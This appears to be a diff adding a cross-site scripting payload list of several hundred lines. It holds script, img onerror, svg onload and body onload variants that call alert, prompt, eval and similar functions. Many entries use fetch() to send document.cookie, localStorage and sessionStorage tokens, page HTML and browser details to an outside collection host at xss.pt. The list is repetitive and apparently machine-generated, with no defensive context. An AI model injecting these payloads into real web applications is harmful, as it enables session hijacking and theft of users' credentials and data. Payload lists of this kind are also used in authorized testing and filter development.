@@ -1,0 +1,1716 @@
+<script>alert(1)</script>
+<script>alert(document.cookie)</script>
+<script>alert('XSS')</script>
+<script>alert("XSS")</script>
+<script>alert(/XSS/)</script>
+<script>alert(1);</script>
+<script>alert(1)//</script>
+<script>alert(1)/*</script>
+<script>alert(1)<!--</script>
+<script>alert(1)--> </script>
+<script>alert(1);alert(2)</script>
+<script>alert(1);alert(2);alert(3)</script>
+<script>alert(1);alert(2);alert(3);alert(4)</script>
+<script>alert(1);alert(2);alert(3);alert(4);alert(5)</script>
+<script>console.log(1)</script>
+<script>console.log(document.cookie)</script>
+<script>console.log('XSS')</script>
+<script>console.log("XSS")</script>
+<script>console.log(/XSS/)</script>
+<script>fetch('http://xss.pt/steal?c='+document.cookie)</script>
+<script>fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href)</script>
+<script>fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer)</script>
+<script>fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent)</script>
+<script>fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain)</script>
+<script>fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title)</script>
+<script>fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height)</script>
+<script>fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height+'&l='+navigator.language)</script>
+<script>fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height+'&l='+navigator.language+'&p='+navigator.platform)</script>
+<script>fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height+'&l='+navigator.language+'&p='+navigator.platform+'&time='+new Date())</script>
+<script>fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height+'&l='+navigator.language+'&p='+navigator.platform+'&time='+new Date()+'&token='+localStorage.getItem('token'))</script>
+<script>fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height+'&l='+navigator.language+'&p='+navigator.platform+'&time='+new Date()+'&token='+localStorage.getItem('token')+'&session='+sessionStorage.getItem('session'))</script>
+<script>fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height+'&l='+navigator.language+'&p='+navigator.platform+'&time='+new Date()+'&token='+localStorage.getItem('token')+'&session='+sessionStorage.getItem('session')+'&c='+document.cookie)</script>
+<script>fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height+'&l='+navigator.language+'&p='+navigator.platform+'&time='+new Date()+'&token='+localStorage.getItem('token')+'&session='+sessionStorage.getItem('session')+'&c='+document.cookie+'&all='+JSON.stringify(localStorage))</script>
+<script>fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height+'&l='+navigator.language+'&p='+navigator.platform+'&time='+new Date()+'&token='+localStorage.getItem('token')+'&session='+sessionStorage.getItem('session')+'&c='+document.cookie+'&all='+JSON.stringify(localStorage)+'&sAll='+JSON.stringify(sessionStorage))</script>
+<script>fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height+'&l='+navigator.language+'&p='+navigator.platform+'&time='+new Date()+'&token='+localStorage.getItem('token')+'&session='+sessionStorage.getItem('session')+'&c='+document.cookie+'&all='+JSON.stringify(localStorage)+'&sAll='+JSON.stringify(sessionStorage)+'&html='+document.documentElement.outerHTML)</script>
+<script>fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height+'&l='+navigator.language+'&p='+navigator.platform+'&time='+new Date()+'&token='+localStorage.getItem('token')+'&session='+sessionStorage.getItem('session')+'&c='+document.cookie+'&all='+JSON.stringify(localStorage)+'&sAll='+JSON.stringify(sessionStorage)+'&html='+document.documentElement.outerHTML+'&forms='+document.forms)</script>
+<script>fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height+'&l='+navigator.language+'&p='+navigator.platform+'&time='+new Date()+'&token='+localStorage.getItem('token')+'&session='+sessionStorage.getItem('session')+'&c='+document.cookie+'&all='+JSON.stringify(localStorage)+'&sAll='+JSON.stringify(sessionStorage)+'&html='+document.documentElement.outerHTML+'&forms='+document.forms+'&links='+document.links)</script>
+<script>fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height+'&l='+navigator.language+'&p='+navigator.platform+'&time='+new Date()+'&token='+localStorage.getItem('token')+'&session='+sessionStorage.getItem('session')+'&c='+document.cookie+'&all='+JSON.stringify(localStorage)+'&sAll='+JSON.stringify(sessionStorage)+'&html='+document.documentElement.outerHTML+'&forms='+document.forms+'&links='+document.links+'&images='+document.images)</script>
+<script>document.write(1)</script>
+<script>document.write(document.cookie)</script>
+<script>document.write('XSS')</script>
+<script>document.write("XSS")</script>
+<script>document.write(/XSS/)</script>
+<script>document.write(1);</script>
+<script>document.write(1)//</script>
+<script>document.write(1)/*</script>
+<script>document.write(1)<!--</script>
+<script>document.write(1)--> </script>
+<script>document.write(1);document.write(2)</script>
+<script>document.write(1);document.write(2);document.write(3)</script>
+<script>document.write(1);document.write(2);document.write(3);document.write(4)</script>
+<script>document.write(1);document.write(2);document.write(3);document.write(4);document.write(5)</script>
+<script>eval('alert(1)')</script>
+<script>eval('alert(document.cookie)')</script>
+<script>eval('alert(\"XSS\")')</script>
+<script>eval("alert('XSS')")</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))</script>
+<script>setTimeout('alert(1)',0)</script>
+<script>setTimeout('alert(document.cookie)',0)</script>
+<script>setTimeout('alert(\"XSS\")',0)</script>
+<script>setInterval('alert(1)',0)</script>
+<script>setInterval('alert(document.cookie)',0)</script>
+<script>setInterval('alert(\"XSS\")',0)</script>
+<script>Function('alert(1)')()</script>
+<script>Function('alert(document.cookie)')()</script>
+<script>Function('alert(\"XSS\")')()</script>
+<script>(alert)(1)</script>
+<script>(alert)(document.cookie)</script>
+<script>(alert)('XSS')</script>
+<script>(alert)(1);</script>
+<script>(alert)(1)//</script>
+<script>(alert)(1)/*</script>
+<script>alert.call(null,1)</script>
+<script>alert.call(null,document.cookie)</script>
+<script>alert.call(null,'XSS')</script>
+<script>alert.apply(null,[1])</script>
+<script>alert.apply(null,[document.cookie])</script>
+<script>alert.apply(null,['XSS'])</script>
+<script>window['alert'](1)</script>
+<script>window['alert'](document.cookie)</script>
+<script>window['alert']('XSS')</script>
+<script>window['alert'](1);</script>
+<script>window['alert'](1)//</script>
+<script>window['alert'](1)/*</script>
+<script>self['alert'](1)</script>
+<script>self['alert'](document.cookie)</script>
+<script>self['alert']('XSS')</script>
+<script>self['alert'](1);</script>
+<script>self['alert'](1)//</script>
+<script>self['alert'](1)/*</script>
+<script>top['alert'](1)</script>
+<script>top['alert'](document.cookie)</script>
+<script>top['alert']('XSS')</script>
+<script>parent['alert'](1)</script>
+<script>parent['alert'](document.cookie)</script>
+<script>parent['alert']('XSS')</script>
+<script>opener['alert'](1)</script>
+<script>opener['alert'](document.cookie)</script>
+<script>opener['alert']('XSS')</script>
+<script>frames['alert'](1)</script>
+<script>frames['alert'](document.cookie)</script>
+<script>frames['alert']('XSS')</script>
+<script>globalThis['alert'](1)</script>
+<script>globalThis['alert'](document.cookie)</script>
+<script>globalThis['alert']('XSS')</script>
+<script>alert`1`</script>
+<script>alert``</script>
+<script>alert(1)</script>
+<script>alert(1);</script>
+<script>alert(1)//</script>
+<script>alert(1)/*</script>
+<script>alert(1)<!--</script>
+<script>alert(1)--> </script>
+<script>alert(1);alert(2)</script>
+<script>alert(1);alert(2);alert(3)</script>
+<script>prompt(1)</script>
+<script>prompt(document.cookie)</script>
+<script>prompt('XSS')</script>
+<script>prompt("XSS")</script>
+<script>confirm(1)</script>
+<script>confirm(document.cookie)</script>
+<script>confirm('XSS')</script>
+<script>confirm("XSS")</script>
+<script>console.log(1)</script>
+<script>console.log(document.cookie)</script>
+<script>console.log('XSS')</script>
+<script>console.log("XSS")</script>
+<script>console.log(/XSS/)</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(document.cookie)>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert("XSS")>
+<img src=x onerror=alert(/XSS/)>
+<img src=x onerror=alert(1);>
+<img src=x onerror=alert(1)//>
+<img src=x onerror=alert(1)/*>
+<img src=x onerror=alert(1)<!-->
+<img src=x onerror=alert(1)--> >
+<img src=x onerror=alert(1);alert(2)>
+<img src=x onerror=alert(1);alert(2);alert(3)>
+<img src=x onerror=alert(1);alert(2);alert(3);alert(4)>
+<img src=x onerror=alert(1);alert(2);alert(3);alert(4);alert(5)>
+<img src=x onerror=fetch('http://xss.pt/steal?c='+document.cookie)>
+<img src=x onerror=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href)>
+<img src=x onerror=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer)>
+<img src=x onerror=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent)>
+<img src=x onerror=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain)>
+<img src=x onerror=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title)>
+<img src=x onerror=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height)>
+<img src=x onerror=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height+'&l='+navigator.language)>
+<img src=x onerror=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height+'&l='+navigator.language+'&p='+navigator.platform)>
+<img src=x onerror=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height+'&l='+navigator.language+'&p='+navigator.platform+'&time='+new Date())>
+<img src=x onerror=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height+'&l='+navigator.language+'&p='+navigator.platform+'&time='+new Date()+'&token='+localStorage.getItem('token'))>
+<img src=x onerror=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height+'&l='+navigator.language+'&p='+navigator.platform+'&time='+new Date()+'&token='+localStorage.getItem('token')+'&session='+sessionStorage.getItem('session'))>
+<img src=x onerror=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height+'&l='+navigator.language+'&p='+navigator.platform+'&time='+new Date()+'&token='+localStorage.getItem('token')+'&session='+sessionStorage.getItem('session')+'&c='+document.cookie)>
+<img src=x onerror=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height+'&l='+navigator.language+'&p='+navigator.platform+'&time='+new Date()+'&token='+localStorage.getItem('token')+'&session='+sessionStorage.getItem('session')+'&c='+document.cookie+'&all='+JSON.stringify(localStorage))>
+<img src=x onerror=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height+'&l='+navigator.language+'&p='+navigator.platform+'&time='+new Date()+'&token='+localStorage.getItem('token')+'&session='+sessionStorage.getItem('session')+'&c='+document.cookie+'&all='+JSON.stringify(localStorage)+'&sAll='+JSON.stringify(sessionStorage))>
+<img src=x onerror=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height+'&l='+navigator.language+'&p='+navigator.platform+'&time='+new Date()+'&token='+localStorage.getItem('token')+'&session='+sessionStorage.getItem('session')+'&c='+document.cookie+'&all='+JSON.stringify(localStorage)+'&sAll='+JSON.stringify(sessionStorage)+'&html='+document.documentElement.outerHTML)>
+<img src=x onerror=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height+'&l='+navigator.language+'&p='+navigator.platform+'&time='+new Date()+'&token='+localStorage.getItem('token')+'&session='+sessionStorage.getItem('session')+'&c='+document.cookie+'&all='+JSON.stringify(localStorage)+'&sAll='+JSON.stringify(sessionStorage)+'&html='+document.documentElement.outerHTML+'&forms='+document.forms)>
+<img src=x onerror=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height+'&l='+navigator.language+'&p='+navigator.platform+'&time='+new Date()+'&token='+localStorage.getItem('token')+'&session='+sessionStorage.getItem('session')+'&c='+document.cookie+'&all='+JSON.stringify(localStorage)+'&sAll='+JSON.stringify(sessionStorage)+'&html='+document.documentElement.outerHTML+'&forms='+document.forms+'&links='+document.links)>
+<img src=x onerror=console.log(1)>
+<img src=x onerror=console.log(document.cookie)>
+<img src=x onerror=console.log('XSS')>
+<img src=x onerror=console.log("XSS")>
+<img src=x onerror=console.log(/XSS/)>
+<img src=x onerror=prompt(1)>
+<img src=x onerror=prompt(document.cookie)>
+<img src=x onerror=prompt('XSS')>
+<img src=x onerror=prompt("XSS")>
+<img src=x onerror=confirm(1)>
+<img src=x onerror=confirm(document.cookie)>
+<img src=x onerror=confirm('XSS')>
+<img src=x onerror=confirm("XSS")>
+<img src=x onerror=document.write(1)>
+<img src=x onerror=document.write(document.cookie)>
+<img src=x onerror=document.write('XSS')>
+<img src=x onerror=document.write("XSS")>
+<img src=x onerror=eval('alert(1)')>
+<img src=x onerror=eval('alert(document.cookie)')>
+<img src=x onerror=eval('alert(\"XSS\")')>
+<img src=x onerror=setTimeout('alert(1)',0)>
+<img src=x onerror=setTimeout('alert(document.cookie)',0)>
+<img src=x onerror=setTimeout('alert(\"XSS\")',0)>
+<img src=x onerror=setInterval('alert(1)',0)>
+<img src=x onerror=setInterval('alert(document.cookie)',0)>
+<img src=x onerror=setInterval('alert(\"XSS\")',0)>
+<img src=x onerror=Function('alert(1)')()>
+<img src=x onerror=Function('alert(document.cookie)')()>
+<img src=x onerror=Function('alert(\"XSS\")')()>
+<img src=x onerror=(alert)(1)>
+<img src=x onerror=(alert)(document.cookie)>
+<img src=x onerror=(alert)('XSS')>
+<img src=x onerror=alert.call(null,1)>
+<img src=x onerror=alert.call(null,document.cookie)>
+<img src=x onerror=alert.call(null,'XSS')>
+<img src=x onerror=alert.apply(null,[1])>
+<img src=x onerror=alert.apply(null,[document.cookie])>
+<img src=x onerror=alert.apply(null,['XSS'])>
+<img src=x onerror=window['alert'](1)>
+<img src=x onerror=window['alert'](document.cookie)>
+<img src=x onerror=window['alert']('XSS')>
+<img src=x onerror=self['alert'](1)>
+<img src=x onerror=self['alert'](document.cookie)>
+<img src=x onerror=self['alert']('XSS')>
+<img src=x onerror=top['alert'](1)>
+<img src=x onerror=top['alert'](document.cookie)>
+<img src=x onerror=top['alert']('XSS')>
+<img src=x onerror=parent['alert'](1)>
+<img src=x onerror=parent['alert'](document.cookie)>
+<img src=x onerror=parent['alert']('XSS')>
+<img src=x onerror=opener['alert'](1)>
+<img src=x onerror=opener['alert'](document.cookie)>
+<img src=x onerror=opener['alert']('XSS')>
+<img src=x onerror=frames['alert'](1)>
+<img src=x onerror=frames['alert'](document.cookie)>
+<img src=x onerror=frames['alert']('XSS')>
+<img src=x onerror=globalThis['alert'](1)>
+<img src=x onerror=globalThis['alert'](document.cookie)>
+<img src=x onerror=globalThis['alert']('XSS')>
+<img src=x onerror=alert`1`>
+<img src=x onerror=alert``>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(1);>
+<img src=x onerror=alert(1)//>
+<img src=x onerror=alert(1)/*>
+<img src=x onerror=alert(1)<!-->
+<img src=x onerror=alert(1)--> >
+<img src=x onerror=alert(1);alert(2)>
+<img src=x onerror=alert(1);alert(2);alert(3)>
+<img src=x onerror=alert(1);alert(2);alert(3);alert(4)>
+<img src=x onerror=alert(1);alert(2);alert(3);alert(4);alert(5)>
+<img src=1 onerror=alert(1)>
+<img src=1 onerror=alert(document.cookie)>
+<img src=1 onerror=alert('XSS')>
+<img src=1 onerror=alert("XSS")>
+<img src=1 onerror=alert(/XSS/)>
+<img src=1 onerror=alert(1);>
+<img src=1 onerror=alert(1)//>
+<img src=1 onerror=alert(1)/*>
+<img src=1 onerror=alert(1)<!-->
+<img src=1 onerror=alert(1)--> >
+<img src=1 onerror=alert(1);alert(2)>
+<img src=1 onerror=alert(1);alert(2);alert(3)>
+<img src=1 onerror=alert(1);alert(2);alert(3);alert(4)>
+<img src=1 onerror=alert(1);alert(2);alert(3);alert(4);alert(5)>
+<img src=1 onerror=fetch('http://xss.pt/steal?c='+document.cookie)>
+<img src=1 onerror=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href)>
+<img src=1 onerror=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer)>
+<img src=1 onerror=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent)>
+<img src=1 onerror=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain)>
+<img src=1 onerror=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title)>
+<img src=1 onerror=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height)>
+<img src=1 onerror=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height+'&l='+navigator.language)>
+<img src=1 onerror=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height+'&l='+navigator.language+'&p='+navigator.platform)>
+<img src=1 onerror=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height+'&l='+navigator.language+'&p='+navigator.platform+'&time='+new Date())>
+<img src=1 onerror=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height+'&l='+navigator.language+'&p='+navigator.platform+'&time='+new Date()+'&token='+localStorage.getItem('token'))>
+<img src=1 onerror=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height+'&l='+navigator.language+'&p='+navigator.platform+'&time='+new Date()+'&token='+localStorage.getItem('token')+'&session='+sessionStorage.getItem('session'))>
+<img src=1 onerror=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height+'&l='+navigator.language+'&p='+navigator.platform+'&time='+new Date()+'&token='+localStorage.getItem('token')+'&session='+sessionStorage.getItem('session')+'&c='+document.cookie)>
+<img src=1 onerror=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height+'&l='+navigator.language+'&p='+navigator.platform+'&time='+new Date()+'&token='+localStorage.getItem('token')+'&session='+sessionStorage.getItem('session')+'&c='+document.cookie+'&all='+JSON.stringify(localStorage))>
+<img src=1 onerror=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height+'&l='+navigator.language+'&p='+navigator.platform+'&time='+new Date()+'&token='+localStorage.getItem('token')+'&session='+sessionStorage.getItem('session')+'&c='+document.cookie+'&all='+JSON.stringify(localStorage)+'&sAll='+JSON.stringify(sessionStorage))>
+<img src=1 onerror=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height+'&l='+navigator.language+'&p='+navigator.platform+'&time='+new Date()+'&token='+localStorage.getItem('token')+'&session='+sessionStorage.getItem('session')+'&c='+document.cookie+'&all='+JSON.stringify(localStorage)+'&sAll='+JSON.stringify(sessionStorage)+'&html='+document.documentElement.outerHTML)>
+<svg/onload=alert(1)>
+<svg/onload=alert(document.cookie)>
+<svg/onload=alert('XSS')>
+<svg/onload=alert("XSS")>
+<svg/onload=alert(/XSS/)>
+<svg/onload=alert(1);>
+<svg/onload=alert(1)//>
+<svg/onload=alert(1)/*>
+<svg/onload=alert(1)<!-->
+<svg/onload=alert(1)--> >
+<svg/onload=alert(1);alert(2)>
+<svg/onload=alert(1);alert(2);alert(3)>
+<svg/onload=alert(1);alert(2);alert(3);alert(4)>
+<svg/onload=alert(1);alert(2);alert(3);alert(4);alert(5)>
+<svg/onload=fetch('http://xss.pt/steal?c='+document.cookie)>
+<svg/onload=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href)>
+<svg/onload=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer)>
+<svg/onload=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent)>
+<svg/onload=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain)>
+<svg/onload=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title)>
+<svg/onload=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height)>
+<svg/onload=console.log(1)>
+<svg/onload=console.log(document.cookie)>
+<svg/onload=console.log('XSS')>
+<svg/onload=console.log("XSS")>
+<svg/onload=prompt(1)>
+<svg/onload=prompt(document.cookie)>
+<svg/onload=prompt('XSS')>
+<svg/onload=prompt("XSS")>
+<svg/onload=confirm(1)>
+<svg/onload=confirm(document.cookie)>
+<svg/onload=confirm('XSS')>
+<svg/onload=confirm("XSS")>
+<svg/onload=document.write(1)>
+<svg/onload=document.write(document.cookie)>
+<svg/onload=document.write('XSS')>
+<svg/onload=document.write("XSS")>
+<svg/onload=eval('alert(1)')>
+<svg/onload=eval('alert(document.cookie)')>
+<svg/onload=eval('alert(\"XSS\")')>
+<svg/onload=setTimeout('alert(1)',0)>
+<svg/onload=setTimeout('alert(document.cookie)',0)>
+<svg/onload=setTimeout('alert(\"XSS\")',0)>
+<svg/onload=setInterval('alert(1)',0)>
+<svg/onload=setInterval('alert(document.cookie)',0)>
+<svg/onload=setInterval('alert(\"XSS\")',0)>
+<svg/onload=Function('alert(1)')()>
+<svg/onload=Function('alert(document.cookie)')()>
+<svg/onload=Function('alert(\"XSS\")')()>
+<svg/onload=(alert)(1)>
+<svg/onload=(alert)(document.cookie)>
+<svg/onload=(alert)('XSS')>
+<svg/onload=alert.call(null,1)>
+<svg/onload=alert.call(null,document.cookie)>
+<svg/onload=alert.call(null,'XSS')>
+<svg/onload=alert.apply(null,[1])>
+<svg/onload=alert.apply(null,[document.cookie])>
+<svg/onload=alert.apply(null,['XSS'])>
+<svg/onload=window['alert'](1)>
+<svg/onload=window['alert'](document.cookie)>
+<svg/onload=window['alert']('XSS')>
+<svg/onload=self['alert'](1)>
+<svg/onload=self['alert'](document.cookie)>
+<svg/onload=self['alert']('XSS')>
+<svg/onload=top['alert'](1)>
+<svg/onload=top['alert'](document.cookie)>
+<svg/onload=top['alert']('XSS')>
+<svg/onload=parent['alert'](1)>
+<svg/onload=parent['alert'](document.cookie)>
+<svg/onload=parent['alert']('XSS')>
+<svg/onload=opener['alert'](1)>
+<svg/onload=opener['alert'](document.cookie)>
+<svg/onload=opener['alert']('XSS')>
+<svg/onload=frames['alert'](1)>
+<svg/onload=frames['alert'](document.cookie)>
+<svg/onload=frames['alert']('XSS')>
+<svg/onload=globalThis['alert'](1)>
+<svg/onload=globalThis['alert'](document.cookie)>
+<svg/onload=globalThis['alert']('XSS')>
+<svg/onload=alert`1`>
+<svg/onload=alert``>
+<svg/onload=alert(1)>
+<svg/onload=alert(1);>
+<svg/onload=alert(1)//>
+<svg/onload=alert(1)/*>
+<svg/onload=alert(1)<!-->
+<svg/onload=alert(1)--> >
+<svg/onload=alert(1);alert(2)>
+<svg/onload=alert(1);alert(2);alert(3)>
+<svg/onload=alert(1);alert(2);alert(3);alert(4)>
+<svg/onload=alert(1);alert(2);alert(3);alert(4);alert(5)>
+<body onload=alert(1)>
+<body onload=alert(document.cookie)>
+<body onload=alert('XSS')>
+<body onload=alert("XSS")>
+<body onload=alert(/XSS/)>
+<body onload=alert(1);>
+<body onload=alert(1)//>
+<body onload=alert(1)/*>
+<body onload=alert(1)<!-->
+<body onload=alert(1)--> >
+<body onload=alert(1);alert(2)>
+<body onload=alert(1);alert(2);alert(3)>
+<body onload=alert(1);alert(2);alert(3);alert(4)>
+<body onload=alert(1);alert(2);alert(3);alert(4);alert(5)>
+<body onload=fetch('http://xss.pt/steal?c='+document.cookie)>
+<body onload=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href)>
+<body onload=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer)>
+<body onload=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent)>
+<body onload=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain)>
+<body onload=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title)>
+<body onload=fetch('http://xss.pt/steal?c='+document.cookie+'&u='+location.href+'&r='+document.referrer+'&ua='+navigator.userAgent+'&d='+document.domain+'&t='+document.title+'&s='+screen.width+'x'+screen.height)>
+<body onload=console.log(1)>
+<body onload=console.log(document.cookie)>
+<body onload=console.log('XSS')>
+<body onload=console.log("XSS")>
+<body onload=prompt(1)>
+<body onload=prompt(document.cookie)>
+<body onload=prompt('XSS')>
+<body onload=prompt("XSS")>
+<body onload=confirm(1)>
+<body onload=confirm(document.cookie)>
+<body onload=confirm('XSS')>
+<body onload=confirm("XSS")>
+<body onload=document.write(1)>
+<body onload=document.write(document.cookie)>
